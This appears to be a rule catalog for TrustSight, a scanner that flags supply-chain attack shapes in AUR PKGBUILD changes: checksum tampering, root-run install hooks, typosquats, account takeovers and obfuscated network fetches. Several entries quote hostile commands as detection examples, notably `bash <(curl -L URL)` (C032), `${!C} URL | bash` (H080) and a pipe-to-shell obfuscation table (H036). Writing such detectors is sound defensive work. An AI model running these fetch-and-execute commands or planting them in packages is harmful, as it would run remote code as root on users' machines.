a001.name: Setuid File In Artifact
a001.description: The conservative default fires and the reviewer decides.

a002.name: Undeclared Unit In Artifact
a002.description: A systemd unit, timer or tmpfiles entry the recipe's declared surface does not explain.

a003.name: Library Outside Depends
a003.description: A linked shared library of a shipped binary outside the declared `depends` closure.

a004.name: Install Hook Diverges From Declaration
a004.description: The built `.INSTALL` script's effective behavior differs from the recipe's `install=` file - a tampered or regenerated hook.

a005.name: Unusual Artifact Mode
a005.description: The L1 C018 rule's artifact twin.

a006.name: File Capabilities In Artifact
a006.description: A file carrying Linux file capabilities (e.g. `cap_setuid`, `cap_sys_admin`), which grant privilege without the setuid bit.

a007.name: Privileged Surface In Artifact
a007.description: A file in a privilege/persistence surface the recipe does not declare: polkit rules, sudoers, PAM config, modprobe/modules-load, or a kernel module (`.ko`).

a008.name: eBPF Artifact In Package
a008.description: Inspection only; nothing is loaded or executed.

c001.name: Checksum Changed Without Source Change With Stable Version
c001.description: A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise. A version move alone no longer stands the signal down when the bump is used as cover: a routine bump that also starts downloading or running something keeps the HIGH finding. Gated by `[thresholds] c001.require_capability_signal` (default true); set it false to restore the historical "every bump is C002" rule.

c002.name: Checksum Updated With Version Bump
c002.description: Normal during routine version bumps. Recorded for audit trail; contributes no weight.

c003.name: Source URL Changed Without Version Bump
c003.description: Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.

c004.name: Checksum Removed For Unchanged Source
c004.description: Distinct from H002 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.

c005.name: Binary Artifact From Untrusted Source
c005.description: A prebuilt binary cannot be reviewed from the PKGBUILD, so its provenance is the only available evidence. Restricted to untrusted buckets deliberately: `-bin` packages repackaging a GitHub release are a large fraction of the AUR and firing on all of them would make the rule pure noise.

c006.name: Maintainer Change With New Source Domain
c006.description: Either signal alone is routine; maintainers change hands, domains migrate. Together they are the shape of an account takeover redirecting sources to attacker-controlled infrastructure. Requires maintainer metadata, so it fires only in the live path, not in offline corpus replay.

c007.name: Command Substitution In Source Array
c007.description: The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.

c008.name: Unread Content Moved Under A Stable Version
c008.description: The [upstream-payload gap](../../explanation/what-trustsight-cannot-see.md) is real: a checksummed tarball's bytes are not in the diff, so a recipe can look untouched while the code it builds is replaced. What *is* in the diff is the carrier's **identity** - the checksum, the commit, the object id - and a change to that with no version change is the same event [H033](#h033) already claims for a git ref and [C001](#c001) for a checksum.

c009.name: Unread Content Moved With The Version
c009.description: The ordinary reading, reported so that the pair is visible rather than only the alarming half. A reader comparing two revisions can see that the bytes behind the pointer changed even though no content appears in the diff.

c010.name: Binary Metadata File
c010.description: A binary metadata file is never legitimate, and it is the most direct way to skip the analysis: git emits only `Binary files ... differ`, so every rule sees an empty change, while the shell still sources the file normally and `bash -c 'source PKGBUILD'` reads it byte for byte. A single NUL byte is enough, and a `.gitattributes` `-diff` or `binary` marker does the same without one.

c011.name: Prebuilt Binary From Non-Upstream Host
c011.description: A `-bin` package ships a prebuilt binary, so the PKGBUILD is not the thing that runs: whatever the source URL serves is. When that URL is on a host unrelated to the project's declared upstream, the only evidence available is the host itself, and the reviewer has to decide whether the mirror is trustworthy.

c012.name: Source Domain Resembles Declared Upstream
c012.description: [R013b](system.md#r013) catches only mixed-script homoglyph domains, and the package/dependency typosquat never looks at domains, so a pure-ASCII mis-spell of the upstream's own host was invisible. The `url=` is declared by the same party under review, so this is a heuristic: it names a near-miss for a reviewer to judge. Eligibility is limited to a trusted-forge or official upstream, which keeps the near-miss meaningful - a source host resembling an *unknown* upstream is not evidence of impersonation.

c013.name: Source Fork Diverges From Declared Upstream
c013.description: The recipe says the upstream is one project and the code comes from a fork of it. That is the shape of a maintainer fork, which is a legitimate `-git` packaging choice, so the rule names the divergence rather than asserting intent: a reviewer sees that the bytes built are not the ones the declared upstream publishes. The same repository name is required, which keeps an unrelated package by the same owner quiet, and a cross-forge source is deliberately not claimed - a mirror on another forge is common and is not evidence on its own. `url=` is declared by the same party under review, so the rule is a heuristic, not proof.

c014.name: Array Order Manipulation
c014.description: Set semantics discard position, so a hash shuffled away from the slot a reviewer checks was invisible. A pure reformat - reorder with no content change and no `SKIP` movement - stands down via `[thresholds] c014.require_content_change` (default true). Measured on the locked benign corpus: 0/3,739.

c015.name: Fetch In package()
c015.description: Reads `RecipeDoc.functions["package"]` only. A client name inside a quoted dependency list or a comment is not a fetch, and `python -m pip install .` (a local install) stands down because the interpreter arm requires a scheme-bearing address on the line. Measured on the locked benign corpus: 7/3,739 (0.19%).

c016.name: Interpreter Invocation In Install Hook
c016.description: Text that is only *printed* (a `cat`/`echo` advisory body in a printed heredoc, or a printer's quoted string) is output, not executed shell, and stands down. A literal shell re-exec wrapper (`sh -c '<lit>'`), as Debian packaging templates generate, is unwrapped first: the inner literal is the code that runs, so only an interpreter the body itself invokes fires. A dynamic argument (`sh -c "$x"`) is not unwrapped and fires as written. A body repeated across the hooks of one file is one finding.

c017.name: Install Hook Writes To A User-Writable Location
c017.description: System destinations (`/etc/skel`, `/usr/...`) are not this rule's business; the S-series and H032/H038 own hook writes to system paths. Measured on the locked benign corpus: 0/3,739.

c018.name: Executable File Committed
c018.description: A projection of the typed `DiffFile.new_mode`; no new walker. Measured on the locked benign corpus: 0/3,739.

c019.name: File Renamed
c019.description: A projection of the typed `DiffFile.rename_from`/`rename_to`. A pure rename carries no hunk, so the parser materialises the file from its rename metadata alone. Measured on the locked benign corpus: 0/3,739.

c020.name: Credentials In A Source URL
c020.description: The evidence names the host only; the credential value itself is never printed. Measured on the locked benign corpus: 0/3,739.

c021.name: Dependency Removal During A Build Change
c021.description: Dropping `checkdepends` eliminates the test-suite execution that would catch a payload; the conjunction with a build change is what makes the removal suspicious rather than hygienic. `optdepends` removal is far more often ordinary cleanup, so it stays MEDIUM. Measured on the locked benign corpus: 27/3,739 (0.72%) combined, the published calibration floor; the fire-rate gate clears `checkdepends` for HIGH.

c022.name: Checksum Strength Downgraded
c022.description: Stands down when every checksum array was removed together - H002 owns that shape. Measured on the locked benign corpus: 43/3,739 (1.15%), every firing a declared strongest-array removal; the rate is published as the calibration floor.

c023.name: IP-Literal Source Host
c023.description: Direct-IP fetches are a C2 shape that generic novelty under-weights. Measured on the locked benign corpus: 0/3,739.

c024.name: Install Script Not Declared
c024.description: The dangling-declaration half (an `install=` naming an absent file) needs tree knowledge and is not yet filed. Measured on the locked benign corpus: 12/3,739 (0.32%).

c025.name: Hardening Option Disabled
c025.description: Debug packages set these routinely, so the benign fire rate is the published number that decides this rule's weight. Measured on the locked benign corpus: 20/3,739 (0.53%).

c026.name: Empty File Added
c026.description: A projection of the typed `DiffFile` status and hunk count. Measured on the locked benign corpus: 0/3,739.

c027.name: Declared Install Script Is Absent
c027.description: Almost always benign (recipe drift, a reverted declaration), so it is INFO. Requires tree knowledge: without the manifest, the file's absence could just be an unchanged file outside the hunk, so the rule never fires on a bare diff (never guess). The inverse of C024, which owns an `.install` shipped without a declaration.

c028.name: Build Cache Outside The Build Trees
c028.description: Fires when the diff adds a build step (`go build`, `cargo fetch`, `npm ci`, ...) that will cache outside `$srcdir`/`$pkgdir` (Go module cache, Cargo registry, npm cache) and the recipe does not override the cache directory. This is a failure by omission, not malice, so it is INFO and weight 0; it reports that the build will write outside the build trees.

c029.name: Backup Array Gains Entries
c029.description: Annotation-tier by default: adding a backup entry is a deliberate, usually legitimate declaration, so it carries no score and is recorded for the reader rather than treated as suspicion.

c030.name: Epoch Removed With Version Unchanged
c030.description: Removing an epoch is usually legitimate, so this is annotation-tier: it carries no score and only records that the version-ordering override silently disappeared. `H063` owns the introduction; `C030` the removal.

c031.name: Boot Or System Image Tool Run During Build
c031.description: H095 covers the same tools when they name a path from the source tree; this covers the tool run against the live host (`mkinitcpio -P`, `grub-install /dev/sda`, `update-initramfs -u`), which names no build path. A package that builds must not rewrite the builder's boot configuration. Install hooks are where these legitimately run, so `post_upgrade() { mkinitcpio -P; }` stays silent; only the build-time functions are in scope. Measured on the locked benign corpus: 0/3,739.

c032.name: Scriptlet Executes Commands At Top Level
c032.description: pacman sources the scriptlet for each operation, so a top-level line runs as root on every invocation, including ones an install-time audit of `post_install()` never sees. The yay typosquat campaign (yyay, yaay, yayy) shipped its payload this way: the hook functions were inert and a bare `bash <(curl -L URL)` sat after them, invisible to every rule that reads function bodies.

coverage.name: Coverage Gap
coverage.description: Something in the change could not be examined (a truncated diff, an unread file, a walk cut short). A gap never moves the score, but it forbids a clean verdict. The gap's own name is on the finding.

d001.name: Novel Dependency Added
d001.description: A dependency name appears that has never been observed anywhere in the AUR. Either a typo or a package created specifically to be pulled in.

d002.name: Typosquatted Dependency
d002.description: A novel dependency name within one or two edits (Damerau-Levenshtein, so transpositions count) of a popular package: `openss1` for `openssl`, `cur1` for `curl`.

d003.name: New Network-Using Makedepends
d003.description: `makedepends` gains a network-capable tool (`curl`, `wget`, `git`, `python-requests`, …) that was not there before, meaning the build can now fetch code that no checksum covers.

d004.name: Dependency Hijack Via Provides
d004.description: `provides=` or `replaces=` declares an **established package unrelated to this one**. `provides=('openssl')` or `replaces=('sudo')` installs this package in front of the real one, satisfying every dependency on it.

e001.name: Added-Text Compression Ratio
e001.description: A highly compressible addition is repetitive, the shape of a packed or padded payload. Silent unless the threshold is set.

e002.name: Encoded-Alphabet Fraction
e002.description: The alphabet sets are X029's, applied as a statistic rather than a staging predicate.

e003.name: Identifier Entropy
e003.description: The second-order statistic keeps the structure a unigram distribution flattens, so it separates generated names (`a`, `b`, `x1` - few bigrams) from packed names more reliably.

g001.name: Shared Gained Host
g001.description: atomic-arch's signature: a new CDN added by many unrelated packages at once.

g002.name: Shared Added Literal
g002.description: The literal's content is never printed - only its length and the members.

g003.name: Coordinated Adoption
g003.description: Adoption is the temporal engine's own predicate - H044 (ownership transition) or H086 (orphan-to-maintained) - recorded per package, not a bare maintainer-change. The finding's `predicates` names which T instance the group joined on; H074 (mass adoption) is the cross-package aggregation this rule performs.

g004.name: Shared Upstream Dependency
g004.description: The committed-manifest counterpart to G001: a dependency name and remote host that many packages gain in the same window is the same-new-upstream-dependency campaign shape. It reads the recorded `upstream_dep_additions` view (the U-series dependency additions); the engine ships and is unit-tested, and the corpus feed that fills the view is the same pending work G002's literal feed is.

g005.name: Impersonation Campaign
g005.description: The registry-impersonation campaign shape: many near-identical name-clones of popular packages under a fresh account (`yyay`/`yay`, `parru`/`paru`, …). Where H029 reports one clone, G005 names the campaign - its maintainer, the member count, and the impersonated targets - so a flood of typosquats reads as one alert, not N. It fires only on the per-package impersonation evidence, so a maintainer updating their own legitimate variant family is not a campaign.

g006.name: Neighborhood Under Campaign Alert
g006.description: The cytokine effect: an alerted neighborhood raises the surrounding tissue's readiness. It is reported, never scored, in v1 - "touches an alerted neighborhood" names a context, not a behaviour - and it never forbids a clean verdict. Only *gained* hosts count.

g007.name: Campaign Corroboration
g007.description: Trained immunity, reported: while a campaign is primed, a package in its scope is named as corroborated - one `G007` entry carrying `campaign_id`, weight 0. It adds no points: the bonus it replaced measured scope *breadth*, not corroboration, and the benign corpus carries no active campaign, so the points were never measured against the false-positive rate. Inert when no campaign is active. See [Campaign Alert Mode](../../explanation/campaign-alert-mode.md).

g008.name: First-Seen Account Adoption Burst
g008.description: The fennekuiper signature: a throwaway account sweeping up orphans in its first cycle. "First-seen" replaces "registered 3 days ago" because registration date is not in the RPC metadata and chasing profile pages would be a new fetch. First-seen is the deterministic, self-contained approximation: a throwaway account has, by definition, no prior maintainer events in the database.

h001.name: Checksum Disabled
h001.description: Fires when a prior SHA-256 checksum is changed to `SKIP`.

h002.name: Checksum Emptied
h002.description: Fires when an existing SHA-256 checksum array is emptied.

h003.name: Insecure Download Protocol
h003.description: Plain HTTP permits a network attacker to replace a download in transit. Adding a checksum in the same diff supplies checksum backing and suppresses this rule; `sha256sums=('SKIP')` does not. The rule is intentionally about transport without newly declared integrity backing, not about pipes or archive suffixes.

h004.name: Privilege Escalation
h004.description: Detects a privilege tool that is *executed* rather than mentioned. Command position is what separates the two: `groups=('sudo')`, an `optdepends` name, and `echo "sudo required"` place the word at an argument position and stay quiet, while `echo "x"; sudo ...` is an execution context and fires. Naming `doas`, `pkexec` and `run0` as well as `sudo` tests what the recipe does rather than which tool its author preferred.

h005.name: validpgpkeys Added
h005.description: H005 is retained as a documentation anchor for a retired rule. It is not in the shipped ruleset and emits no finding. A post-diff `validpgpkeys` declaration is reported as `P002` at weight 0; changes to an existing signing-key set are handled by H078, and removal is handled by H024.

h006.name: New Make/Opt/Check Dependency
h006.description: H006 is retained as a documentation anchor for a retired rule. It emits no finding: a network-capable `makedepends` addition is scored by [D003](#d003), and an `optdepends` addition is reported as a fact, never scored, without corpus state.

h007.name: Symlink Redirect
h007.description: H007 is retained as a documentation anchor for a retired rule. It emits no finding; a symlink written outside `$pkgdir` is one shape of [H076](#h076).

h008.name: Suspicious Environment Variable
h008.description: H008 is retained as a documentation anchor for a retired rule. It emits no finding: the indirect `CFLAGS="$(...)"` shape is [X024](crossfire.md#x024), and a top-level flag-set replacement is [H079](#h079).

h009.name: Network connection attempt
h009.description: H009 is retained as a documentation anchor for a reserved `runtime` id. No code emits it: the current model cannot observe post-install behaviour from a static diff, so the identifier is held so a future runtime probe can use it without a baseline change.

h010.name: Suspicious file write
h010.description: H010 is retained as a documentation anchor for a reserved `runtime` id. No code emits it; a write to a sensitive location is claimed by the static rules when the diff shows it, such as [H076](#h076) and [R058](#r058).

h011.name: Sensitive binary execution
h011.description: H011 is retained as a documentation anchor for a reserved `runtime` id. No code emits it; it is held alongside [H009](#h009) for a future runtime probe.

h012.name: Strace detection attempt (TracerPid check)
h012.description: H012 is retained as a documentation anchor for a reserved `runtime` id. No code emits it: reading `TracerPid` is post-install behaviour a static diff cannot observe. [H067](#h067) claims the static anti-analysis probe.

h013.name: Strace log truncated (possible flood evasion)
h013.description: H013 is retained as a documentation anchor for a reserved `runtime` id. No code emits it; it is held alongside [H012](#h012).

h014.name: Eval or Exec Usage
h014.description: H014 is retained as a documentation anchor for a retired rule. It emits no finding: `eval` of a substitution is [R039](#r039), and a top-level fetch that accompanies an `exec` is [H077](fetch-and-execution.md#h077).

h015.name: Critical Build Function Modified
h015.description: The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.

h016.name: Hidden Network Fetch In Build
h016.description: A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.

h017.name: Install Hook Fetches Or Executes
h017.description: A `.install` hook body (`post_install`, `post_upgrade`, `pre_install`, `pre_upgrade`, `pre_remove`, `post_remove`) downloads something or performs a privileged operation: `chmod u+s`, `systemctl enable`, `eval`, `useradd`.

h018.name: Patch Applied From Outside The Build Tree
h018.description: `patch` or `git apply` inside a build function takes its input from a URL, an absolute path, or process substitution.

h019.name: Source URL Downgraded To HTTP
h019.description: A URL declared in `source=()` as `https://` before the diff appears as `http://` after it, with the same host and path. Plain http was never upgraded; this is a URL that lost its transport security.

h020.name: Very Recent Update
h020.description: Packages updated moments ago have not been visible to the community long enough for anyone to vet them. Combined with other signals - maintainer change, new source domains - recency escalates suspicion.

h021.name: Brand New Package
h021.description: A package that barely exists has no reputation. An established package with a recent update is routine; a package uploaded last week has zero track record.

h022.name: Stale Package Revived
h022.description: Account takeovers happen on stale packages: a maintainer stops responding, someone else adopts the AUR record, and the new maintainer may be malicious. A gap of a year or more between the version you already have and the one being offered is worth a medium-weight flag, independent of any diff signal.

h023.name: Install Hook Present
h023.description: An `.install` scriptlet runs code **as root** at install time. H023 is pure context - "this package has a root-time hook" - not an accusation. It is the metadata a human wants when weighing other signals.

h024.name: GPG Verification Removed
h024.description: This is the exact inverse of the declared evidence. `detect_verification_evidence` emits `P002` at weight 0 when signatures are present, reporting the claim without crediting it; H024 adds a scoring signal when that protection is **removed**. The asymmetry is deliberate: declaring verification costs an attacker nothing, but removing it is a change to the recipe's own prior behaviour, which is evidence. Dropping GPG verification is a strong supply-chain signal with near-zero benign rate: maintainers almost never remove working signature verification.

h025.name: Build Environment Subversion
h025.description: Injecting a malicious object via `LD_PRELOAD`/`LDFLAGS`, or redirecting the compiler/linker via `PATH`, is a classic build-time attack - the untrusted input silently subverts the build.

h026.name: Untrusted Maintainer Takeover (corpus path)
h026.description: The per-package H026 asks the observation database whether an account has been seen. On the corpus path the snapshot is the better witness: it names the maintainer of every package in the AUR. H026 ships alongside H044 on the same transition, as two findings on two pieces of evidence, so a handover between established packagers carries H044 alone.

h027.name: Capability Density Anomaly
h027.description: Most updates change one thing. A diff that *simultaneously* adds a network fetch, writes a file, and base64-decodes a payload is disproportionate; the co-occurrence is more suspicious than the sum of its parts.

h028.name: Accelerated Release Cadence
h028.description: H028 is **metadata, never a scored finding**. The pipeline records whether the HEAD commit has 3+ commits within 24 hours (counting HEAD itself) as the `recent_commit_burst` boolean on `PackageFact`; it is not appended to `triggered_rules` and contributes nothing to the score.

h029.name: Package-Name Typosquat
h029.description: This is the AUR equivalent of the `python-sqlite` vs `pysqlite`, `electron` vs `electorn`, and trailing-space/separator-swap attacks that have hit every other registry. The AUR has **zero** typosquat defense; D002 already covers *dependency* names, but nothing covers the package's **own name** impersonating a popular one.

h030.name: Dependency-Set Expansion
h030.description: **Why not count alone:** Adding 5 deps that are all common (`glibc`, `qt6-base`, `cmake`) is a normal heavy build and should not fire. The signal is count **weighted by how rare/novel each added dep is**, reusing D001's `dependency_observation_count` as a rarity proxy. Novel/obscure deps push the magnitude up; common deps contribute near zero.

h031.name: Version-In-URL Injection
h031.description: Both halves are required. An unsafe version string that is never interpolated stays quiet, and an interpolated version made only of version characters is ordinary packaging. What the rule describes is a value carrying delimiters (`;`, whitespace, `/`) being substituted into something the build fetches.

h032.name: Write To User Home Or RC
h032.description: The severity is contextual. A write into a user's home during `build()` is HIGH; the same write from an **install scriptlet** is CRITICAL, because pacman runs scriptlets as root during the transaction. Nothing a package installs belongs in somebody's home directory, and root reaching into one is categorical rather than suspicious.

h033.name: Moved Git Ref
h033.description: A tag is a name upstream can repoint at will, so "the same tag" is not the same code twice. TrustSight never resolves a tag against the network (see [the security model](../../security.md#the-invariants)), so the rule works from declared facts: the commit a recipe pins, and the version it claims.

h034.name: Exotic Source Protocol
h034.description: `data:` URIs carry no `://` and are not scheme tokens, which is an accepted gap rather than a silent pass.

h035.name: Foreign Package Manager In Install Hook
h035.description: Install hooks run as root at install time. Invoking another package manager from inside an AUR package's install hook modifies system state outside pacman's control, creating untracked dependencies and potential conflicts.

h036.name: Shell Obfuscation Density
h036.description: | Indicator | Pattern | |-----------|---------| | Base64 decode | `base64 -d` / `base64 --decode` | | Hex escape | `printf '\x...'` | | Command substitution | `$(` or `` ` `` | | Eval | `eval` | | Pipe to shell | `\| bash` / `\| sh` / `\| zsh` | | URL shortener | `bit.ly`, `t.co`, `tinyurl`, `shorturl`, `ow.ly`, `is.gd` | | Quiet wget pipe | `wget -q -O - \|` | | Variable expansion with network/shell | `${var}...curl` / `${var}...bash` | | ANSI-C quoting (June-W3) | `$'...'` | | Variable indirection (June-W3) | `${!var}` | | Empty-quote concatenation (June-W3) | `word''word` |

h037.name: Long-Stable Property Changed
h037.description: A tracked property with no more specific rule (`license`, `install_hook_present`) changed after a long stable run.

h038.name: World-Writable Staging
h038.description: `/tmp`, `/var/tmp` or `/dev/shm` is used as a working or execution directory. `mktemp -d` is excluded wholesale: a random private directory is not a fixed world-writable path.

h039.name: Systemd ExecStart From Runtime-Writable Path
h039.description: The rule reads the unit's *content*, including a heredoc body, not the unit's filename. A name proves nothing; the `ExecStart` line is the fact.

h040.name: Host Reconnaissance
h040.description: A lone `uname -m` is an architecture check and is reported at INFO by design. `env`, `dmidecode` and `systemd-detect-virt` are deliberately absent: the first produced a false positive on a `sed` expression, and the other two are H067's.

h041.name: Upload To Paste Or File-Drop Host
h041.description: Direction is the entire rule. The same host list also feeds the `raw_hosting` source bucket, so a paste host in `source=()` is already carried at +15 and a rule that fired on it would double-count that weight. What no bucket can see is the other direction: a request leaving a build with a body attached, addressed to a host whose purpose is to accept an anonymous drop and hand back a link.

h042.name: Hidden Drop
h042.description: H042 is deliberately the quietest rule in the group so that one payload does not fire three times: a hidden write that is later executed belongs to H069/H072, one in a world-writable directory to H038, one in the user's home to H032. H042 claims only the hidden drop none of those own.

h043.name: Attack-Chain Composition
h043.description: Stages: takeover (H026, H044, H074), mass adoption (H045, H073), install hook (H023, H017), foreign fetch (R001, H035, H066, H034), payload (H068, H069), obfuscation (H036, H065), anti-analysis (H067), write-then-execute (H072), staging (H038), recon (H040), persistence (H039, H062, H076), exfil (H041, H071), hidden drop (H042), integrity removed (H091) and sabotage (S001-S008). Later rules also map onto these stages, including R041, R054, R144, the H080-H083/H089-H091 additions and the X001-X034 crossfire rules; the authoritative rule-to-stage map is `_STAGE_OF` in `analysis/composition.py`.

h044.name: Ownership Transition
h044.description: A move to an empty maintainer is abandonment, which H046 and H060 handle as orphan state rather than as a takeover.

h045.name: Mass Adoption
h045.description: One maintainer submitted at least `[thresholds] h045.min_packages` (default 10) packages within `h045.window_days` (default 7).

h046.name: Orphan/Adoption Dependency
h046.description: A package depends directly on a package orphaned or adopted in this cycle.

h047.name: Security-Relevant Build Flag Change
h047.description: Dropping a hardening flag is the weightier direction, because it removes a mitigation the package had.

h048.name: Dependency Vendored Into Source
h048.description: Narrowed to that mechanical case on purpose. Vendoring a library bypasses the distribution's security updates for it, and `[patterns] security_relevant_libraries` is what raises the severity.

h050.name: Version Scheme Changed
h050.description: The package's version scheme changed (semver to date, and so on). Context only, by design.

h052.name: Shared Source Repository
h052.description: At least `[thresholds] h052.min_packages` (default 3) otherwise unrelated packages share a source repository, a new domain, or an adoption window.

h053.name: Name/Host Consensus Divergence
h053.description: H053 reads the name as a claim about where a package should come from, and checks the source against it. A `python-`, `ruby-` or `nodejs-` package is normally published on that ecosystem's own index (PyPI, RubyGems, npm) or built straight from a forge such as GitHub or GitLab. This rule fires on a new package whose name claims an ecosystem but whose source comes from a host that is neither: a name pointing one way while the source points another is the shape of a typosquat, or of a dependency silently redirected to somebody else's server. It compares the name to the source, not the code, so a project that legitimately mirrors its release elsewhere, or publishes only from a personal server, can trip it. The finding names the prefix and the host so the reader can judge that call.

h055.name: Attribute Burst
h055.description: Only modified packages count. H045 already claims the added-package clusters, so counting additions here would report the same maintainer twice.

h056.name: Known Indicator of Compromise
h056.description: Five surfaces are read: the package's own name; names added to `depends`/`makedepends`/`optdepends`/`checkdepends`/`provides`/`replaces`/ `conflicts`; the host of any URL and any bare host token; any hex digest of digest length; and a file the diff added or modified, or the recipe names via `install=` or a local `source=()` entry. A `pkgbuild_pattern` entry is matched as a regular expression against added lines; an invalid or catastrophic-backtracking pattern is refused at load rather than run. The IOC federation stage is separate and reports attributed matches through `PackageFact.ioc_matches`; see [IOC Federation](../ioc.md).

h057.name: Transitive Exposure
h057.description: A package's transitive closure, at least `[thresholds] h057.min_hops` (default 2) hops away, reaches a package adopted out of the orphan state this cycle. Context only, never additive.

h058.name: Maintainer Baseline Deviation
h058.description: H058 watches how much a maintainer does, not what a package contains. TrustSight counts how many packages each maintainer updates in a cycle, and after a few cycles it knows that maintainer's own normal pace. A cycle far above that pace is flagged, because a burst of updates is what a hijacked account, or an account that has just changed hands, tends to produce: the attacker publishes everything at once, under a name the reviewers already trust. This is a prompt to look, not proof. A maintainer with a genuinely busy day, or one who legitimately adopted several packages at once, can trip it; adoption is reported on its own by [H074](#h074) and [H086](#h086) from the maintainer field, without needing a burst. Bumping one project's own naming family in lockstep (a kernel's `-docs`/`-headers` splits, `foo`/`foo-bin`/`foo-qt` released together) is one logical update spread over several package names, not a deviation, so the rule stands down when every active package belongs to a single relatedness cluster.

h059.name: Name/Repo Divergence
h059.description: The package name and the repository it is built from share no meaningful token.

h060.name: Transitive Orphan Risk
h060.description: A package's transitive closure includes a currently orphaned package. Context only, never additive.

h061.name: Dependency Centrality
h061.description: A package is depended on by at least `[thresholds] h061.min_dependents` (default 50) AUR packages. Prioritisation only: it says what a compromise would reach, not that anything is wrong.

h062.name: Pacman Hook Installed
h062.description: A pacman hook runs on every later transaction, which is why it is reported; packages legitimately ship them, which is why it is MEDIUM.

h063.name: Epoch Introduced
h063.description: An epoch overrides normal version comparison, so introducing one forces an upgrade regardless of what the version numbers say. A pre-existing epoch never surfaces in a hunk, so bumping one is quiet. `epoch=0` is INFO: it initialises the field without changing the ordering.

h064.name: Provides/Replaces Scope Expansion
h064.description: Claiming another project's name redirects installs of that name to this package. Relatedness suppresses the obvious false positive: variant, companion and sibling stems of the package's own name never fire. Cold start cannot fire either branch, since neither corpus nor pacman data exists to establish what is established. H064 always runs; D004 covers the same ground and may double-report when it is enabled (it is, by default).

h065.name: Obfuscated Literal Reconstructed
h065.description: The tokenizer rebuilds these forms so that H035, R003 and R039 match on what a line *means* rather than how it is spelled. H065 is what tells the reader that this happened: without it the report quotes text the file does not contain. It carries no weight, so it cannot move a score; it changes what the reader is looking at.

h066.name: Embedded Binary In Tree
h066.description: H066 has two variants that split by evidence and never double-fire. **H066-tree** is this one: it needs the file manifest, so it runs on the git path, where the clone is always available, and on the corpus path when the AUR snapshot tarball was fetched. When the corpus path has no snapshot, the result reports `tree_analyzed = false` rather than reading as a full-coverage UNFLAGGED result.

h067.name: Anti-Analysis Check
h067.description: A build script checking whether it is being watched has no legitimate purpose. Architecture and feature detection (`uname -m`, `getconf`) is not a probe and does not fire.

h068.name: Reconstructed Executable Payload
h068.description: This is a type check on the decoder's output, which is why one rule covers every encoded-payload variant without naming the encoding. Encoded text assets, checksums and keys decode to none of those magics.

h069.name: Build-time Generation Then Execution
h069.description: Writing a config file, a `.desktop` entry or a patch that a declared build step consumes is not generation-then-execution and does not fire.

h070.name: Archive Trailer Anomaly
h070.description: H070 is a pure function over bytes (`check_archive_trailer`). It is wired on the corpus-side AUR snapshot path, where `fetch_pkgbuild_with_tree` already has the tarball bytes and the analysis pipeline can surface the finding without fetching any PKGBUILD-supplied URL.

h071.name: Covert Egress
h071.description: The command-position anchor is what separates use from mention: a client named in a string or listed in `makedepends` never fires.

h072.name: Write Then Execute
h072.description: The execution side counts interpreters, `source`, `.`, compilers and a plain absolute path at a command position, with or without arguments. Files that arrived through a declared `source=` and the project's own configure/make artefacts are exempt.

h073.name: Introduction Rate Deviation
h073.description: The corpus-wide introduction rate for a cycle deviates from the baseline mean by at least `[thresholds] h073.z_score` (default 3.0), once at least `h073.min_history_cycles` (default 3) cycles of history exist. An immature history is quiet.

h074.name: Adopt-then-Modify
h074.description: H074 is the exception to the novelty ceiling described in [what TrustSight cannot see](../../explanation/what-trustsight-cannot-see.md): it fires on the **first** package of a campaign, from the maintainer field and commit times alone, before any payload shape exists to recognise. Adoption without a version change is quiet, and so is a change outside the window.

h075.name: Remote Script Via Process Substitution
h075.description: Each still executes remote code at build time, so it belongs with R001/R002 rather than at R010/R011's "uses curl" LOW.

h076.name: Build Writes Outside Staging Root
h076.description: Rather than a list of interesting directories, the rule is the shape: a packaging step may only write inside the staging roots. An absolute system path changes the machine doing the build, and pacman tracks none of it. Top level is the worse case, because it runs when makepkg sources the file. Install hooks are excluded, since H032/H038/H039/H062 own the target system. Devices (`> /dev/null`) and extractor artefacts are excluded by requiring a plain absolute path.

h077.name: Parse-time Network Fetch
h077.description: Everything at the top level executes as soon as makepkg sources the recipe, which happens on `makepkg --printsrcinfo`, on an AUR helper's metadata refresh, and on anything else that reads the file. That is before a build step runs and before the checksum array covers anything. R010 and R011 report a downloader inside a build function at LOW; running one at parse time is a different claim, so it is a different rule.

h078.name: Signing Key Set Changed
h078.description: Whoever holds a key in `validpgpkeys` can ship code to every user of the package, so the set changing is a trust change that the diff states outright. H024 owns the removal case, verification being taken away. H078 owns the other two: a key **replaced** (one fingerprint out, a different one in) means the same sources are now trusted under a different holder, and a key **added** to an existing set widens who may sign. Introducing `validpgpkeys` where there was none is signature checking being switched on, so it is reported as a neutral fact rather than as a finding against the package.

h079.name: Build Flags Weakened
h079.description: makepkg exports a hardened flag set. A recipe that appends to it keeps those mitigations; one that assigns over it drops every mitigation the distribution configured, and one that spells out a disabling flag drops a named one. Either way the installed binary is built with weaker mitigations than the same source built through the normal path, and no package metadata says so.

h080.name: Indirect Command Expansion
h080.description: `${!C}` expands to the *value of the variable whose name is held in `C`*, so `C=curl; ${!C} URL | bash` executes `curl` while the recipe carries no literal `curl` and no literal shell on the line R001/R002/H077/H069 read. The tokenizer refuses to evaluate indirection statically, so the obfuscated line reaches the rules verbatim and every literal-match rule steps over it: flagging the indirection itself closes that whole family at once.

h081.name: Committed File Executed Without Declaration
h081.description: H069/H072 own files the recipe itself writes; H066 owns committed ELF binaries. Between them sat the cleartext helper script: committed to the AUR repository, never named in `source=()` (so makepkg never copies it into `$srcdir` and its bytes never reach the differ), and executed through `$startdir` or a `../` climb. Two signals, either sufficient: the `$startdir` or `../` path reference (available even without a manifest), or the basename in the tree manifest (only when a manifest was supplied - without one the rule never guesses). An absolute `/usr/share/...` target cannot be a repository file, however its basename collides, so the manifest signal requires a relative path.

h082.name: Fetch Then Execute
